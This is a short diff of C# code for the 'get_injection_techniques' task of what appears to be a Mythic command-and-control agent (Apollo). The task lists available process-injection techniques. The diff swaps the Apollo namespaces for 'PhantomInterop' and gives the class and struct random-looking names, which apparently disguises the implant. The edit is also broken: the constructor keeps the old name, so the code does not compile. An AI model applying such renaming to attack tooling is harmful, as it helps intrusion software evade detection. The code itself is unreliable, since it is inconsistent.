@@ -6,26 +6,26 @@
 
 #if GET_INJECTION_TECHNIQUES
 
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using System;
 using System.Collections.Generic;
 using System.Runtime.Serialization;
 
 namespace Tasks
 {
-    public class get_injection_techniques : Tasking
+    public class GhostHandler34C4 : Tasking
     {
         [DataContract]
-        internal struct InjectionTechniqueResult
+        internal struct CipherRouterD1B9
         {
             [DataMember(Name = "name")]
             public string Name;
             [DataMember(Name = "is_current")]
             public bool IsCurrent;
         }
-        public get_injection_techniques(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
+        public get_injection_techniques(IAgent agent, PhantomInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
         }
         
